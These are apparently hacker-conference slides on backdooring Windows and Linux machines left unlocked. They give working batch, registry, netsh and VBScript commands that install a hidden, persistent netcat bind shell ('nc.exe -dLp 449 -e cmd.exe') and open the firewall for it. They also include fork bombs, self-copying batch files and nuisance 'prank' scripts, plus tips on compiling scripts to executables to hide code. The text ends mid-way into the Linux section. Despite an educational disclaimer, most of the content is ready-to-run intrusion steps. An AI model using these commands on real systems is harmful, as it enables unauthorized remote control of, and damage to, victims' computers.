An Introduction to Backdooring 
Operating Systems 
Lance Buttars Aka Nemus
DC801
www.dc801.org
www.introtobackdoors.com - Updated Slides
Special Thanks to Natedmac , Metacortex, Grifter, 
D3c4f and everyone at DC801
Disclaimer 
• The information provided in this presentation is to be 
used for educational purposes only.
• I am in no way responsible for any misuse of the 
information provided. 
• All of the information is to develop a defense attitude 
in order to provided insight into possibilities. 
• In no way should you use the information to cause 
any kind of damage directly or indirectly. 
• You implement the information given in this 
presentation at your own risk. 
• Contact a Lawyer if you have legal questions.
What this presentation
 does NOT cover.
• How to hide your backdoor from skilled forensics 
investigators.
• How to clean up any logs or breadcrumbs you will 
leave behind.
• Any legal Issues you may encounter.
• This is not the best way to deploy a backdoor, but its 
good practice in understanding how backdoors work 
and what you can do with them.
Perquisites
• Familiarity with Linux command line and 
bash shell.
• Familiarity with networking and 
firewalls.
• Familiarity with windows CMD and 
command line.
Scenario: Target leaves their desk and 
their computer is unlocked.
Guess what? This happens right?
So what else could we do?
Lets see how fast we can install a back 
door.
Backdooring Windows 7
• Lets set up a backdoor on a Windows 7 system 
using netcat.
• For now lets assume the user is logged in with 
admin privileges. 
Prep Work
• Netcat is not full featured and you will want 
more capability. To solve this we will create a 
toolkit of portable applications to: 
– Download more files or addition software.
– Edit files and make changes.
– Setup the back door quickly
– Execute pranks and control a computer remotely.
•Put your toolkit on a usb drive or host it on a remote 
webserver.
Portable Applications
• Portable applications are applications that 
have everything they need to run inside there 
executable binary.
–They don’t rely on dlls.
–They don’t rely on registry settings.
• Hopefully the don’t leave any either.
–They have a very small footprint on the 
operating system because they don’t 
require extra setup to run.
Windows 7 Toolkit setup
• gVim
– http://code.google.com/p/vim-
win3264/downloads/detail?name=vim73-x64.
zip&can=2&q=
• Wget (for windows 64 bit)
– http://nebm.ist.utl.pt/~glopes/wget/
•  Netcat
– Or from Kali find / -name nc.exe
• http://www.kali.org/
• http://joncraton.org/blog/46/netcat-for-windows/ 
Hello World of Backdoors
Netcat
•nc.exe -dLp 449 -e cmd.exe
– L This option makes Netcat a persistent listener 
which starts listening again after a client 
disconnect.
– p Port number that netcat is listening on.
– e Execute a command once a connection has been 
received in this example we start a cmd session.
– d This has something to do with making nc silent.
Batch commands to set up persistent
 backdoor on Windows 7
@echo
offxcopy "%systemdrive%\%username%\Desktop\nc.exe" "C:
\Windows\System32\" -y
reg add "HKLM\software\microsoft\windows\currentversion\run" /f /v "system" /t 
REG_SZ /d "C:\windows\system32\nc.exe -Ldp 449 -e cmd.exe”
netsh advfirewall firewall add rule name="Rule 34" dir=in action=allow 
protocol=UDP localport=449
netsh advfirewall firewall add rule name="Allow Messenger" dir=in action=allow 
program="C:\windows\system32\nc.exe"
• # you must run these commands with administrator privileges.
Example expanded from
http://www.offensive-security.com/metasploit-unleashed/Persistent_Netcat_Backdoor
Basic Windows CMD
Linux Commands
•
cd - Change directory.
•
pwd - Present working directory.
•
ls - List all files in directory.
•
cat file.txt - Display file contents. 
•
wget - Download files from cli.
•
vim  - Edit files cli.
•
./scriptname - Run script
•
export PATH=$PATH:/opt/new 
- Modify  system path to find new 
executables
Windows Versions
•
cd
•
pwd
•
dir /p
•
type
•
wget from tool kit
•
vim from tool kit (edit is gone ☹)
•
wscript scriptname.vbs
•
SET PATH=%PATH%;c:\pathtoolkit
CMD Path
c:\> set PATH "%PATH%;C:\bin"
Batch Script To Manage Windows PATH Environment Variable
http://gallery.technet.microsoft.com/Batch-Script-To-Manage-7d0ef21e
VBS Script to start Netcat in the 
background.
This is so we don’t have to wait for the user to 
restart their computer.
Dim objShellSet objShell = WScript.CreateObject 
("WScript.shell")objShell.run "C:\windows\system32\nc.
exe -Ldp 449 -e cmd.exe"Set objShell = Nothing
Connect Using Net cat
nc –v ipaddress port
Verify Netcat backdoor using Process 
Explorer (PS)
Download PS http://technet.microsoft.com/en-
us/sysinternals/bb896653.aspx
Download TCPView
http://technet.microsoft.com/en-us/sysinternals/bb897437.aspx 
View Connections to your System using 
TCPView
Run Command or Batch without cmd
Set WshShell = CreateObject("WScript.Shell") 
WshShell.Run chr(34) & "C:\mybat.bat" & Chr(34), 0Set WshShell = Nothing
@echo off
start /B mybat.bat
Batch
PowerShell.exe -windowstyle hidden
VBScript   
Powershell
Windows Pranks
http://vbscripts.webs.com/pranks
• Let the keyboard type "Hello" continuously
Set wshShell = wscript.CreateObject("WScript.Shell") do 
wscript.sleep 100 
wshshell.sendkeys "Hello" loop
VBScript save as .vbs
Windows Pranks  
http://vbscripts.webs.com/pranks
• Toggle the Caps Lock button continuously
Set wshShell =wscript.CreateObject("WScript.Shell") do 
wscript.sleep 100 
wshshell.sendkeys "{CAPSLOCK}" loop
VBScript save as .vbs
Spread Garbage Everywhere randomly
Spread every where like a virushttp://www.
instructables.com/id/how-to-make-a-fork-bomb-exe/
:ecopy /Y %0 %random%.bat
start %0%0|%0
goto :e
Batch File save as .bat
Start Notepad continuously
Or start a website continuously 
• start "www.example.com"
Batch File save as .bat
http://vbscripts.webs.com/pranks
@echo off 
:top 
START %SystemRoot%
\system32\notepad.exe 
GOTO top
Make a disco on their keyboard
• This script lights up your scroll lock, caps lock and num 
locks LED's and flashes in a cool rhythmic way which 
gives the perception of a live disco on your keyboard. 
http://vbscripts.webs.com/pranks
Set wshShell =wscript.CreateObject("WScript.Shell")do
wscript.sleep 100
wshshell.sendkeys "{CAPSLOCK}"
wshshell.sendkeys "{NUMLOCK}"
wshshell.sendkeys "{SCROLLLOCK}"loop
VBScript save as .vbs
Play windows startup tone
Set objVoice = CreateObject("SAPI.SpVoice")
Set objFile = CreateObject("SAPI.SpFileStream.1")
objFile.Open "Windows XP Startup.wav"
objVoice.Speakstream objFile
http://vbscripts.webs.com/pranks
VBScript save as .vbs
Pop Cd Rom Drive
Continually Pop Out the CD drive
Set oWMP = CreateObject("WMPlayer.OCX.7") Set colCDROMs = 
oWMP.cdromCollectiondo if colCDROMs.Count >= 1 then For i = 0 to 
colCDROMs.Count - 1 
colCDROMs.Item(i).EjectNext For i = 0 to colCDROMs.Count - 1 
colCDROMs.Item(i).Eject Next End If 
wscript.sleep 5000 loop
VBScript save as .vbs
Windows Fork Bomb
• a fork bomb is an attack wherein a process 
continually replicates to eat up available 
system resources slowing a computer to a 
crawl. 
• Windows Batch Fork Bomb
@ECHO OFF 
:START 
START fork.bat 
GOTO START
Batch save as .bat
Unclosable File
@echo off
md hello
:A
start hello
goto A
Batch save as .bat
Speak Out Loud to User
Set args = Wscript.Argumentsspeakargtext = 
args.Item(0) strText = "your message here"Set 
objVoice = CreateObject("SAPI.SpVoice")
objVoice.Speak strText
objVoice.Speak speakargtext
VBScript save as .vbs
Shutdown windows
• %windir%\system32\shutdown.exe -r -t 00
• shutdown -r — restarts
• shutdown -s — shutsdown
• shutdown -l — logoff
• shutdown -t xx — where xx is number of seconds 
to wait till shutdown/restart/logoff
• shutdown -i — gives you a dialog box to fill in 
what function you want to use
• shutdown -a — aborts the previous shutdown 
command
Batch to Exe
• To make your scripts and batch files harder to read.
– This is not foolproof, but helps hide your code.
• Batchor CMD
– http://sourceforge.net/projects/bat2exe/
• VBS
– http://sourceforge.net/projects/htwoo/
• Powershell
– http://ps2exe.codeplex.com/ (beta)
netsh advfirewall 
For windows 7
C:\> netsh advfirewall set allprofiles state off
– Turn off windows firewall will notify user
C:\> netsh advfirewall set allprofiles state on
– Turns firewall on
C:\> netsh advfirewall reset
– Reset the firewall back to default
C:\> netsh advfirewall set allprofiles firewallpolicy blockinbound,
allowoutbound
– Block everything
C:\> netsh advfirewall firewall add rule name="HTTP" protocol=TCP 
localport=80 action=block dir=IN
– Open Port
C:\> netsh advfirewall firewall delete rule name="HTTP”
– Delete Rule
Schedule commands with “at” for a later time.
\\computername: Use this parameter to specify a remote computer. If you omit this parameter, 
tasks are scheduled to run on the local computer.
time: Use this parameter to specify the time when the task is to run. Time is specified as hours:
minutes based on the 24-hour clock. For example, 0:00 represents midnight and 20:30 represents 8:
30 P.M.
/every:date,...: Use this parameter to schedule the task to run on the specified day or days of the 
week or month, for example, every Friday or the eighth day of every month.
/next:date,...: Use this parameter to schedule the task to run on the next occurrence of the day (for 
example, next Monday). Specify date as one or more days of the week (use the following 
abbreviations: M,T,W,Th,F,S,Su) or one or more days of the month (use the numbers 1 through 31).
command: Use this parameter to specify the cmd command, the program (.exe or .com file), or the 
batch program (.bat or .cmd file) that you want to run. If the command requires a path as an 
argument, use the absolute path name (the entire path beginning with the drive letter). If the 
command is on a remote computer, use the Uniform Naming Convention (UNC) path name 
(\\ServerName\ShareName). If the command is not an executable (.exe) file, you must precede the 
command with cmd /c, for example, cmd /c copy C
Note When you use the at command, the scheduled task is run by using the credentials of 
the system account.  http://support.microsoft.com/kb/313565
at \\computername time | /every:date,... /next:date,... command
at \\computername id /delete | /delete/yes
Sdelete
(secure delete) 
Usage: sdelete [-p passes] [-s] [-q]  ...sdelete 
[-p passes] [-z|-c] [drive letter] ...
-a Remove Read-Only attribute.
-c Clean free space.
-p passesSpecifies number of overwrite passes (default is 1).
-q Don't print errors (Quiet).
-s or -r Recurse subdirectories.
-z Zero free space (good for virtual disk optimization).
http://technet.microsoft.com/en-us/sysinternals/bb897443.aspx
Backdoor Linux
• Lets set up a backdoor on a Linux system using 
net cat.
• We assume the users is logged in as root and 
the terminal is left open and unattended. 
Linux Tool Kit
• Compile missing items to make them portable 
then test them on target systems.
• Autossh
– http://www.harding.motd.ca/autossh/
• Netcat 
– http://netcat.sourceforge.net/ Compile it
• Shred (core utils)
– http://www.linuxfromscratch.
org/lfs/view/development/chapter05/coreutils.html
• Screen
– http://www.linuxfromscratch.
org/blfs/view/svn/general/screen.html
Persistent connection script
By default GNU netcat does not have a persistent 
connection. You will need to run it in a while loop if 
you want to connect to it more than once. 